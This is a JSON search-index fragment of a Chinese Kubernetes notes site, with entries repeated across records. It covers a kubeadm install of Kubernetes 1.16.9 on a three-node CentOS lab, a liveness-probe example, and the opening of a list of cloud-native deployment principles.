https://raw.githubusercontent.com/coreos/flannel/2140ac876ef134e0ed5af15c65e414cf26827915/Documentation/kube-flannel.yml # kubectl get ds -l app=flannel -n kube-system NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE kube-flannel-ds-amd64 1 1 1 1 1 <none> 39s kube-flannel-ds-arm 0 0 0 0 0 <none> 39s kube-flannel-ds-arm64 0 0 0 0 0 <none> 39s kube-flannel-ds-ppc64le 0 0 0 0 0 <none> 39s kube-flannel-ds-s390x 0 0 0 0 0 <none> 39s # kubeadm token create --print-join-command W0628 09:12:59.371222 26258 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] kubeadm join 192.168.70.130:6443 --token jf0j4u.lieaijygwth7jcoo --discovery-token-ca-cert-hash sha256:1899cb7904899c7377fa01ca452d7260241f2f333f6dfff1bc843f338224ffb9 node\u6267\u884c\uff1a # kubeadm join 192.168.119.191:6443 --token jf0j4u.lieaijygwth7jcoo --discovery-token-ca-cert-hash sha256:1899cb7904899c7377fa01ca452d7260241f2f333f6dfff1bc843f338224ffb9 \u6d4b\u8bd5\u96c6\u7fa4\uff1a \u5728master\u4e0a\u6267\u884c # kubectl run curl --image=radial/busyboxplus:curl -it kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. If you don't see a command prompt, try pressing enter. $ nslookup kubernetes.default Server: 10.96.0.10 Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.local Name: kubernetes.default Address 1: 10.96.0.1 kubernetes.default.svc.cluster.local # \u6d4b\u8bd5\u96c6\u7fa4\u662f\u5426\u6b63\u5e38 # kubectl create deployment nginx --image=nginx deployment.apps/nginx created # \u521b\u5efaservice # kubectl expose deployment nginx --port=80 --type=NodePort service/nginx exposed # kubectl get pods,svc NAME READY STATUS RESTARTS AGE pod/nginx-6799fc88d8-wp9db 0/1 ContainerCreating 0 19s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/kubernetes ClusterIP 10.1.0.1 <none> 443/TCP 31m service/nginx NodePort 10.1.245.2 <none> 80:31532/TCP 6s $ curl 10.1.245.2 <!DOCTYPE html> <html> <head>","title":"K8S 1.16.9\u90e8\u7f72"},{"location":"lxc/kubernetes/kubernetes1.16/#k8s-116","text":"\u5b9e\u9a8c\u73af\u5883\uff1a \u4e3b\u673a\u540d IP\u5730\u5740 k8s\u7248\u672c master 192.168.70.130 v1.16.9 node1 192.168.70.141 v1.16.9 node1 192.168.70.142 v1.16.9 \u673a\u5668\u90fd\u5173\u95edselinux\u548c\u9632\u706b\u5899","title":"\u672c\u5730\u90e8\u7f72K8S 1.16"},{"location":"lxc/kubernetes/kubernetes1.16/#_1","text":"# cat >> /etc/hosts << EOF 192.168.70.130 k8s-master 192.168.70.141 k8s-node1 192.168.70.142 k8s-node2 EOF # yum -y install wget vim # mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak # wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # yum clean all && yum makecache # yum install net-tools -y # sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab # \u4e34\u65f6\u7981\u7528 # swapoff -a # \u672c\u6587\u7684k8s\u7f51\u7edc\u4f7f\u7528flannel\uff0c\u8be5\u7f51\u7edc\u9700\u8981\u8bbe\u7f6e\u5185\u6838\u53c2\u6570bridge-nf-call-iptables=1\uff0c\u4fee\u6539\u8fd9\u4e2a\u53c2\u6570\u9700\u8981\u7cfb\u7edf\u6709br_netfilter\u6a21\u5757\u3002 # \u67e5\u770bbr_netfilter\u6a21\u5757\uff1a # lsmod |grep br_netfilter # \u5982\u679c\u7cfb\u7edf\u6ca1\u6709br_netfilter\u6a21\u5757\u5219\u6267\u884c\u4e0b\u9762\u7684\u65b0\u589e\u547d\u4ee4\uff0c\u5982\u6709\u5219\u5ffd\u7565 # \u4e34\u65f6\u65b0\u589ebr_netfilter\u6a21\u5757: # modprobe br_netfilter # lsmod |grep br_netfilter br_netfilter 22256 0 bridge 151336 1 br_netfilter # \u8be5\u65b9\u5f0f\u91cd\u542f\u540e\u4f1a\u5931\u6548 # \u6c38\u4e45\u65b0\u589ebr_netfilter\u6a21\u5757\uff1a # cat > /etc/rc.sysinit << EOF #!/bin/bash for file in /etc/sysconfig/modules/*.modules ; do [ -x $file ] && $file done EOF # cat > /etc/sysconfig/modules/br_netfilter.modules << EOF modprobe br_netfilter EOF # chmod 755 /etc/sysconfig/modules/br_netfilter.modules # cat <<EOF > /etc/sysctl.d/k8s.conf vm.swappiness = 0 net.bridge.bridge-nf-call-ip6tables = 1 net.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-iptables = 1 EOF # cat > /etc/sysconfig/modules/ipvs.modules <<EOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack EOF # chmod 755 /etc/sysconfig/modules/ipvs.modules && bash /etc/sysconfig/modules/ipvs.modules && lsmod | grep -e ip_vs -e nf_conntrack_ipv4 # yum install yum-utils device-mapper-persistent-data lvm2 openssl socat conntrack ebtables ipset # yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # yum list docker-ce --showduplicates | sort -r # yum install -y docker-ce-18.09.9 docker-ce-cli-18.09.9 containerd.io # systemctl enable docker && systemctl start docker # # mkdir /etc/docker # cat > /etc/docker/daemon.json <<EOF { # \"registry-mirrors\": [ \"https://registry.docker-cn.com\", \"http://hub-mirror.c.163.com\", \"https://docker.mirrors.ustc.edu.cn\" ], \"exec-opts\": [\"native.cgroupdriver=systemd\"], \"log-driver\": \"json-file\", \"log-opts\": { \"max-size\": \"100m\" }, \"storage-driver\": \"overlay2\", \"storage-opts\": [ \"overlay2.override_kernel_check=true\" ] } EOF # systemctl daemon-reload && systemctl restart docker # cat <<EOF > /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/ enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF # \u66f4\u65b0\u7f13\u5b58 # yum clean all # yum -y makecache # yum list kubelet --showduplicates | sort -r # yum install -y kubelet-1.16.9 kubeadm-1.16.9 kubectl-1.16.9 # systemctl enable kubelet.service && systemctl start kubelet # vi image.sh #!/bin/bash url=registry.cn-hangzhou.aliyuncs.com/google_containers version=v1.16.9 images=(`kubeadm config images list --kubernetes-version=$version|awk -F '/' '{print $2}'`) for imagename in ${images[@]} ; do docker pull $url/$imagename docker tag $url/$imagename k8s.gcr.io/$imagename docker rmi -f $url/$imagename done # chmod 777 image.sh # ./image.sh","title":"\u4e09\u53f0\u673a\u5668\u90fd\u6267\u884c\uff1a"},{"location":"lxc/kubernetes/kubernetes1.16/#master","text":"# kubeadm init \\ --apiserver-advertise-address=192.168.70.130 \\ --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers \\ --kubernetes-version v1.16.9 \\ --service-cidr=10.1.0.0/16 \\ --pod-network-cidr=10.244.0.0/16 W0628 09:01:05.568405 20714 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups ...\u7701\u7565... Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.70.130:6443 --token eufass.9mj0z1oafwjwna8y \\ --discovery-token-ca-cert-hash sha256:1899cb7904899c7377fa01ca452d7260241f2f333f6dfff1bc843f338224ffb9 # echo \"export KUBECONFIG=/etc/kubernetes/admin.conf\" >> ~/.bash_profile # source .bash_profile # mkdir -p $HOME/.kube # cp -i /etc/kubernetes/admin.conf $HOME/.kube/config # chown $(id -u):$(id -g) $HOME/.kube/config \u67e5\u770b\u96c6\u7fa4\u72b6\u6001 # kubectl get cs NAME AGE scheduler <unknown> controller-manager <unknown> etcd-0 <unknown> # kubectl get cs -o=go-template='{{printf \"|NAME|STATUS|MESSAGE|\\n\"}}{{range .items}}{{$name := .metadata.name}}{{range .conditions}}{{printf \"|%s|%s|%s|\\n\" $name .status .message}}{{end}}{{end}}' |NAME|STATUS|MESSAGE| |scheduler|True|ok| |controller-manager|True|ok| |etcd-0|True|{\"health\":\"true\"}| \u90e8\u7f72\u7f51\u7edc # \u8fd9\u4e2ayml\u6587\u4ef6\u53ef\u4ee5\u63d0\u524d\u4e0b\u8f7d\u4e0b\u6765 # kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/2140ac876ef134e0ed5af15c65e414cf26827915/Documentation/kube-flannel.yml # kubectl get ds -l app=flannel -n kube-system NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE kube-flannel-ds-amd64 1 1 1 1 1 <none> 39s kube-flannel-ds-arm 0 0 0 0 0 <none> 39s kube-flannel-ds-arm64 0 0 0 0 0 <none> 39s kube-flannel-ds-ppc64le 0 0 0 0 0 <none> 39s kube-flannel-ds-s390x 0 0 0 0 0 <none> 39s # kubeadm token create --print-join-command W0628 09:12:59.371222 26258 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] kubeadm join 192.168.70.130:6443 --token jf0j4u.lieaijygwth7jcoo --discovery-token-ca-cert-hash sha256:1899cb7904899c7377fa01ca452d7260241f2f333f6dfff1bc843f338224ffb9","title":"master\u6267\u884c\uff1a"},{"location":"lxc/kubernetes/kubernetes1.16/#node","text":"# kubeadm join 192.168.119.191:6443 --token jf0j4u.lieaijygwth7jcoo --discovery-token-ca-cert-hash sha256:1899cb7904899c7377fa01ca452d7260241f2f333f6dfff1bc843f338224ffb9 \u6d4b\u8bd5\u96c6\u7fa4\uff1a \u5728master\u4e0a\u6267\u884c # kubectl run curl --image=radial/busyboxplus:curl -it kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. If you don't see a command prompt, try pressing enter. $ nslookup kubernetes.default Server: 10.96.0.10 Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.local Name: kubernetes.default Address 1: 10.96.0.1 kubernetes.default.svc.cluster.local # \u6d4b\u8bd5\u96c6\u7fa4\u662f\u5426\u6b63\u5e38 # kubectl create deployment nginx --image=nginx deployment.apps/nginx created # \u521b\u5efaservice # kubectl expose deployment nginx --port=80 --type=NodePort service/nginx exposed # kubectl get pods,svc NAME READY STATUS RESTARTS AGE pod/nginx-6799fc88d8-wp9db 0/1 ContainerCreating 0 19s NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/kubernetes ClusterIP 10.1.0.1 <none> 443/TCP 31m service/nginx NodePort 10.1.245.2 <none> 80:31532/TCP 6s $ curl 10.1.245.2 <!DOCTYPE html> <html> <head>","title":"node\u6267\u884c\uff1a"},{"location":"lxc/kubernetes/liveness/","text":"Liveness liveness \u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6761\u4ef6\uff0c\u901a\u8fc7\u6761\u4ef6\u63a2\u6d4b\u5224\u65ad\u5bb9\u5668\u662f\u5426\u5065\u5eb7\u3002\u5982\u679c\u63a2\u6d4b\u5931\u8d25\uff0cKubernetes\u5c31\u4f1a\u91cd\u542f\u5e94\u7528 \u4e3e\u4f8b\u8bf4\u660e\uff0c\u521b\u5efa\u5982\u4e0bpod\uff1a apiVersion: v1 kind: Pod metadata: labels: test: liveness name: liveness spec: restartPolicy: OnFailure containers: - name: liveness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u542f\u52a8\u8fdb\u7a0b\u9996\u5148\u521b\u5efa\u6587\u4ef6 /tmp/healthy\uff0c30 \u79d2\u540e\u5220\u9664\uff0c\u5728\u6211\u4eec\u7684\u8bbe\u5b9a\u4e2d\uff0c\u5982\u679c /tmp/healthy \u6587\u4ef6\u5b58\u5728\uff0c\u5219\u8ba4\u4e3a\u5bb9\u5668\u5904\u4e8e\u6b63\u5e38\u72b6\u6001\uff0c\u53cd\u6b63\u5219\u53d1\u751f\u6545\u969c\u3002 livenessProbe \u90e8\u5206\u5b9a\u4e49\u5982\u4f55\u6267\u884c Liveness \u63a2\u6d4b\uff1a 1. \u63a2\u6d4b\u7684\u65b9\u6cd5\u662f\uff1a\u901a\u8fc7 cat \u547d\u4ee4\u68c0\u67e5 /tmp/healthy \u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u8fd4\u56de\u503c\u4e3a\u96f6\uff0cKubernetes \u5219\u8ba4\u4e3a\u672c\u6b21 Liveness \u63a2\u6d4b\u6210\u529f\uff1b\u5982\u679c\u547d\u4ee4\u8fd4\u56de\u503c\u975e\u96f6\uff0c\u672c\u6b21 Liveness \u63a2\u6d4b\u5931\u8d25\u3002 initialDelaySeconds: 10 \u6307\u5b9a\u5bb9\u5668\u542f\u52a8 10 \u4e4b\u540e\u5f00\u59cb\u6267\u884c Liveness \u63a2\u6d4b\uff0c\u6211\u4eec\u4e00\u822c\u4f1a\u6839\u636e\u5e94\u7528\u542f\u52a8\u7684\u51c6\u5907\u65f6\u95f4\u6765\u8bbe\u7f6e\u3002\u6bd4\u5982\u67d0\u4e2a\u5e94\u7528\u6b63\u5e38\u542f\u52a8\u8981\u82b1 30 \u79d2\uff0c\u90a3\u4e48 initialDelaySeconds \u7684\u503c\u5c31\u5e94\u8be5\u5927\u4e8e 30\u3002 periodSeconds: 5 \u6307\u5b9a\u6bcf 5 \u79d2\u6267\u884c\u4e00\u6b21 Liveness \u63a2\u6d4b\u3002Kubernetes \u5982\u679c\u8fde\u7eed\u6267\u884c 3 \u6b21 Liveness \u63a2\u6d4b\u5747\u5931\u8d25\uff0c\u5219\u4f1a\u6740\u6389\u5e76\u91cd\u542f\u5bb9\u5668\u3002 \u4e0b\u9762\u521b\u5efa Pod liveness\uff1a sh ubantu@k8s-master:~$ ubantu@k8s-master:~$ kubectl apply -f liveness.yml pod \"liveness\" created ubantu@k8s-master:~$ \u4ece\u914d\u7f6e\u6587\u4ef6\u53ef\u77e5\uff0c\u6700\u5f00\u59cb\u7684 30 \u79d2\uff0c/tmp/healthy \u5b58\u5728\uff0ccat \u547d\u4ee4\u8fd4\u56de 0\uff0cLiveness \u63a2\u6d4b\u6210\u529f\uff0c\u8fd9\u6bb5\u65f6\u95f4 kubectl describe pod liveness \u7684 Events\u90e8\u5206\u4f1a\u663e\u793a\u6b63\u5e38\u7684\u65e5\u5fd7\u3002 35 \u79d2\u4e4b\u540e\uff0c\u65e5\u5fd7\u4f1a\u663e\u793a /tmp/healthy \u5df2\u7ecf\u4e0d\u5b58\u5728\uff0cLiveness \u63a2\u6d4b\u5931\u8d25\u3002\u518d\u8fc7\u51e0\u5341\u79d2\uff0c\u51e0\u6b21\u63a2\u6d4b\u90fd\u5931\u8d25\u540e\uff0c\u5bb9\u5668\u4f1a\u88ab\u91cd\u542f\u3002 \u9664\u4e86 Liveness \u63a2\u6d4b\uff0cKubernetes Health Check \u673a\u5236\u8fd8\u5305\u62ec Readiness \u63a2\u6d4b \u963f\u91cc\u4e91\u5bf9\u5e94\u7684\u8bbe\u7f6e\uff1a","title":"liveness"},{"location":"lxc/kubernetes/liveness/#liveness","text":"liveness \u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6761\u4ef6\uff0c\u901a\u8fc7\u6761\u4ef6\u63a2\u6d4b\u5224\u65ad\u5bb9\u5668\u662f\u5426\u5065\u5eb7\u3002\u5982\u679c\u63a2\u6d4b\u5931\u8d25\uff0cKubernetes\u5c31\u4f1a\u91cd\u542f\u5e94\u7528 \u4e3e\u4f8b\u8bf4\u660e\uff0c\u521b\u5efa\u5982\u4e0bpod\uff1a apiVersion: v1 kind: Pod metadata: labels: test: liveness name: liveness spec: restartPolicy: OnFailure containers: - name: liveness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u542f\u52a8\u8fdb\u7a0b\u9996\u5148\u521b\u5efa\u6587\u4ef6 /tmp/healthy\uff0c30 \u79d2\u540e\u5220\u9664\uff0c\u5728\u6211\u4eec\u7684\u8bbe\u5b9a\u4e2d\uff0c\u5982\u679c /tmp/healthy \u6587\u4ef6\u5b58\u5728\uff0c\u5219\u8ba4\u4e3a\u5bb9\u5668\u5904\u4e8e\u6b63\u5e38\u72b6\u6001\uff0c\u53cd\u6b63\u5219\u53d1\u751f\u6545\u969c\u3002 livenessProbe \u90e8\u5206\u5b9a\u4e49\u5982\u4f55\u6267\u884c Liveness \u63a2\u6d4b\uff1a 1. \u63a2\u6d4b\u7684\u65b9\u6cd5\u662f\uff1a\u901a\u8fc7 cat \u547d\u4ee4\u68c0\u67e5 /tmp/healthy \u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u8fd4\u56de\u503c\u4e3a\u96f6\uff0cKubernetes \u5219\u8ba4\u4e3a\u672c\u6b21 Liveness \u63a2\u6d4b\u6210\u529f\uff1b\u5982\u679c\u547d\u4ee4\u8fd4\u56de\u503c\u975e\u96f6\uff0c\u672c\u6b21 Liveness \u63a2\u6d4b\u5931\u8d25\u3002 initialDelaySeconds: 10 \u6307\u5b9a\u5bb9\u5668\u542f\u52a8 10 \u4e4b\u540e\u5f00\u59cb\u6267\u884c Liveness \u63a2\u6d4b\uff0c\u6211\u4eec\u4e00\u822c\u4f1a\u6839\u636e\u5e94\u7528\u542f\u52a8\u7684\u51c6\u5907\u65f6\u95f4\u6765\u8bbe\u7f6e\u3002\u6bd4\u5982\u67d0\u4e2a\u5e94\u7528\u6b63\u5e38\u542f\u52a8\u8981\u82b1 30 \u79d2\uff0c\u90a3\u4e48 initialDelaySeconds \u7684\u503c\u5c31\u5e94\u8be5\u5927\u4e8e 30\u3002 periodSeconds: 5 \u6307\u5b9a\u6bcf 5 \u79d2\u6267\u884c\u4e00\u6b21 Liveness \u63a2\u6d4b\u3002Kubernetes \u5982\u679c\u8fde\u7eed\u6267\u884c 3 \u6b21 Liveness \u63a2\u6d4b\u5747\u5931\u8d25\uff0c\u5219\u4f1a\u6740\u6389\u5e76\u91cd\u542f\u5bb9\u5668\u3002 \u4e0b\u9762\u521b\u5efa Pod liveness\uff1a sh ubantu@k8s-master:~$ ubantu@k8s-master:~$ kubectl apply -f liveness.yml pod \"liveness\" created ubantu@k8s-master:~$ \u4ece\u914d\u7f6e\u6587\u4ef6\u53ef\u77e5\uff0c\u6700\u5f00\u59cb\u7684 30 \u79d2\uff0c/tmp/healthy \u5b58\u5728\uff0ccat \u547d\u4ee4\u8fd4\u56de 0\uff0cLiveness \u63a2\u6d4b\u6210\u529f\uff0c\u8fd9\u6bb5\u65f6\u95f4 kubectl describe pod liveness \u7684 Events\u90e8\u5206\u4f1a\u663e\u793a\u6b63\u5e38\u7684\u65e5\u5fd7\u3002 35 \u79d2\u4e4b\u540e\uff0c\u65e5\u5fd7\u4f1a\u663e\u793a /tmp/healthy \u5df2\u7ecf\u4e0d\u5b58\u5728\uff0cLiveness \u63a2\u6d4b\u5931\u8d25\u3002\u518d\u8fc7\u51e0\u5341\u79d2\uff0c\u51e0\u6b21\u63a2\u6d4b\u90fd\u5931\u8d25\u540e\uff0c\u5bb9\u5668\u4f1a\u88ab\u91cd\u542f\u3002 \u9664\u4e86 Liveness \u63a2\u6d4b\uff0cKubernetes Health Check \u673a\u5236\u8fd8\u5305\u62ec Readiness \u63a2\u6d4b \u963f\u91cc\u4e91\u5bf9\u5e94\u7684\u8bbe\u7f6e\uff1a","title":"Liveness"},{"location":"lxc/kubernetes/principle/","text":"Kubernetes\u5e94\u7528\u90e8\u7f72\u57fa\u672c\u539f\u5219 \u5728\u672c\u6587\u4e2d\uff0c\u6211\u5c06\u4ecb\u7ecd\u5982\u4f55\u8bbe\u8ba1\u4e91\u539f\u751f\u5e94\u7528\u7a0b\u5e8f\u5e76\u5c06\u5176\u90e8\u7f72\u5728 Kubernetes \u4e0a\u7684 8 \u6761\u539f\u5219\u3002 \u539f\u52191\uff1apod\u591a\u526f\u672c Kubernetes \u7684\u81ea\u6211\u4fee\u590d\u7279\u6027\uff0c\u4f7fKubernetes \u53ef\u4ee5\u91cd\u542f\u5931\u8d25\u7684\u5bb9\u5668\u3001\u66ff\u6362\u5bb9\u5668\u3001\u6740\u6b7b\u4e0d\u54cd\u5e94\u7528\u6237\u5b9a\u4e49\u7684\u8fd0\u884c\u72b6\u51b5\u68c0\u67e5\u7684\u5bb9\u5668\uff0c\u5e76\u4e14\u5728\u51c6\u5907\u597d\u670d\u52a1\u4e4b\u524d\u4e0d\u5c06\u5176\u901a\u544a\u7ed9\u5ba2\u6237\u7aef\u3002\u5f53\u6211\u4eec\u4f7f\u7528deployment\u6216StatefulSet\u90e8\u7f72\u5de5\u4f5c\u8d1f\u8f7d\u7684\u65f6\u5019\uff0c\u786e\u4fddspec.replicas\u7684\u526f\u672c\u96c6\u6570\u91cf\u4e0d\u4f4e\u4e8e1\uff0cdev\u6216uat\u73af\u5883\u9664\u5916\u3002 \u901a\u8fc7service\u7684\u8d1f\u8f7d\u5747\u8861\uff0c\u8fd0\u884c\u591a\u4e2a\u5bb9\u5668\u5b9e\u4f8b\u4fdd\u969c\u5e94\u7528\u7684\u8fde\u7eed\u6027\uff0c\u5373\u4f7f\u90e8\u5206\u5bb9\u5668\u5f02\u5e38\u91cd\u542f\u4e5f\u80fd\u4fdd\u969c\u5e94\u7528\u7684\u6b63\u5e38\u8bbf\u95ee\u3002 \u539f\u52192\uff1aSecret\u548cConfigMap\u7075\u6d3b\u4f7f\u7528 \u914d\u7f6e\u3001\u5bc6\u94a5\u7b49\u6587\u4ef6\u53ef\u4ee5\u901a\u8fc7\u6784\u5efa\u5230\u955c\u50cf\u6216\u8bbe\u7f6e\u5230\u73af\u5883\u53d8\u91cf\u4e2d\u5f15\u7528\uff0c\u5f53\u6587\u4ef6\u6709\u66f4\u65b0\uff0c\u5219\u9700\u8981\u91cd\u65b0\u6784\u5efa\u955c\u50cf\u53d1\u5e03\u540e\u751f\u6548\uff0c\u65e0\u6cd5\u505a\u5230\u70ed\u66f4\u65b0\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Kubernetes\u7684volumes\u6302\u8f7d\u65b9\u5f0f\u5f15\u7528\u81ea\u5df1\u521b\u5efa\u7684secret\uff08\u5bc6\u6587\uff09\u6216configmap\uff08\u660e\u6587\uff09\uff0c\u6302\u8f7d\u5230\u5bb9\u5668\u4e2d\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u505a\u5230\u70ed\u66f4\u65b0 \u539f\u52193\uff1aHorizontal Pod Autoscaler (HPA)\u4f7f\u7528 \u4ece\u6765\u6ca1\u6709\u4eba\u613f\u610f\u4ed6\u4eec\u7684\u670d\u52a1\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u8017\u5c3d\u5bb9\u91cf\u3002\u540c\u6837\uff0c\u6ca1\u6709\u4eba\u5e0c\u671b\u56e0\u4e3a Pod \u7684\u5bb9\u91cf\u4e0d\u8db3\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u3002\u6839\u636e\u53ef\u6269\u5c55\u6027\u8bbe\u8ba1\u539f\u5219\uff0c\u6211\u4eec\u5e94\u8be5\u4ece\u4e00\u5f00\u59cb\u5c31\u4e3a\u5355pod\u505a\u597d\u5168\u94fe\u8def\u538b\u6d4b\uff0c\u6709\u9488\u5bf9\u6027\u7684\u8bbe\u7f6epod\u7684\u6700\u5c0f\u526f\u672c\u6570\uff0c\u5e76\u4e3a\u5de5\u4f5c\u8d1f\u8f7d\u5e94\u5bf9\u7a81\u53d1\u6d41\u91cf\u6700\u597d\u9884\u4f30\uff0c\u901a\u8fc7cpu\u5185\u5b58\u7b49\u767e\u5206\u6bd4\u8bbe\u7f6epod\u7684\u6700\u5927\u526f\u672c\u6570\u3002\u8fd9\u5bf9\u4e8e\u5e94\u7528\u53ef\u7528\u6027\u548c\u53ef\u6269\u5c55\u6027\u81f3\u5173\u91cd\u8981\u3002\uff08StatefulSet\u6709\u72b6\u6001\u5e94\u7528\u4e5f\u53ef\u4ee5\u4f7f\u7528HPA\u81ea\u52a8\u4f38\u7f29\uff0c\u4e0d\u8fc7\u5efa\u8bae\u624b\u52a8\u89e6\u53d1\uff0c\u4f8b\u5982\u6269\u5c55\u6570\u636e\u5e93\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5927\u91cf\u6570\u636e\u590d\u5236\u548c\u989d\u5916\u7684\u4e8b\u52a1\u7ba1\u7406\u53d1\u751f\uff0c\u5982\u679c\u6570\u636e\u5e93\u5df2\u7ecf\u5904\u4e8e\u9ad8\u8d1f\u8f7d\u72b6\u6001\uff0c\u8fd9\u4f1a\u4ea7\u751f\u4e0d\u53ef\u63a7\u5236\u7684\u95ee\u9898\u3002\u6b64\u5916\u5982\u679c\u6709\u72b6\u6001\u7ec4\u4ef6\u9700\u8981\u4ee5\u67d0\u79cd\u65b9\u5f0f\u4e0e\u5176\u4ed6\u5b9e\u4f8b\u540c\u6b65\uff0c\u8bf7\u8003\u8651\u7981\u7528\u81ea\u52a8\u7f29\u51cf\u3002\uff09 \u539f\u52194\uff1a\u751f\u547d\u5468\u671f\u7ba1\u7406 \u5f53 Kubernetes \u6740\u6b7b\u4e00\u4e2a pod \u65f6\uff0c\u4f1a\u53d1\u751f\u4ee5\u4e0b 5 \u4e2a\u6b65\u9aa4\uff1a 1\u3001 Pod \u5207\u6362\u5230\u7ec8\u6b62\u72b6\u6001\u5e76\u505c\u6b62\u63a5\u6536\u4efb\u4f55\u65b0\u6d41\u91cf\uff0c\u5bb9\u5668\u4ecd\u5728 pod \u5185\u8fd0\u884c\u3002 2\u3001 preStop \u94a9\u5b50\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u547d\u4ee4\u6216 HTTP \u8bf7\u6c42\u88ab\u6267\u884c\uff0c\u5e76\u88ab\u53d1\u9001\u5230 pod \u5185\u7684\u5bb9\u5668\u3002 3\u3001 SIGTERM \u4fe1\u53f7\u88ab\u53d1\u9001\u5230 pod\uff0c\u5bb9\u5668\u610f\u8bc6\u5230\u5b83\u5c06\u5f88\u5feb\u5173\u95ed\u3002 4\u3001 Kubernetes \u7b49\u5f85\u5bbd\u9650\u671f (terminationGracePeriodSeconds)\u3002\u6b64\u7b49\u5f85\u4e0e preStop hook \u548c SIGTERM \u4fe1\u53f7\u6267\u884c\u5e76\u884c\uff08\u9ed8\u8ba4 30 \u79d2\uff09\u3002\u56e0\u6b64\uff0cKubernetes \u4e0d\u4f1a\u7b49\u5f85\u8fd9\u4e9b\u5b8c\u6210\u3002\u5982\u679c\u8fd9\u6bb5\u65f6\u95f4\u7ed3\u675f\uff0c\u5219\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u6b65\u3002\u6b63\u786e\u8bbe\u7f6e\u5bbd\u9650\u671f\u7684\u503c\u975e\u5e38\u91cd\u8981\u3002 5\u3001\u5411 pod \u53d1\u9001 SIGKILL \u4fe1\u53f7\uff0c\u7136\u540e\u79fb\u9664 pod\u3002\u5982\u679c\u5bb9\u5668\u5728\u5bbd\u9650\u671f\u540e\u4ecd\u5728\u8fd0\u884c\uff0c\u5219 Pod \u88ab SIGKILL \u5f3a\u884c\u79fb\u9664\uff0c\u7ec8\u6b62\u5b8c\u6210\u3002 \u5f53Kubernetes\u5e94\u7528\u505a\u4e86\u670d\u52a1\u7f51\u683csidecar\u6ce8\u5165\uff0c\u9700\u5148\u4fdd\u8bc1\u4e1a\u52a1pod\u548cistio-proxy pod\u542f\u52a8\u987a\u5e8f\u548c\u505c\u6b62\u987a\u5e8f\uff0c\u907f\u514d\u5bb9\u5668\u5728\u91cd\u542f\u548c\u66f4\u65b0\u7684\u65f6\u5019\u6709\u6d41\u91cf\u5f02\u5e38\uff0c\u9ed8\u8ba4\u963f\u91ccASM\u5f00\u542f\u4e86holdApplicationUntilProxyStarts\u548cHoldProxyUntilApplicationEnds\u529f\u80fd\u3002\u53e6\u5916\u5bb9\u5668\u5e94\u7528\u7684\u4f18\u96c5\u505c\u6b62\uff0c\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u914d\u7f6epreStop webhook\u811a\u672c\u4ee5\u53caterminationGracePeriodSeconds\u65f6\u95f4\u3002 \u539f\u52195\uff1a\u6b63\u786e\u914d\u7f6e\u5b58\u6d3b\u63a2\u9488\u53ca\u5c31\u7eea\u63a2\u9488 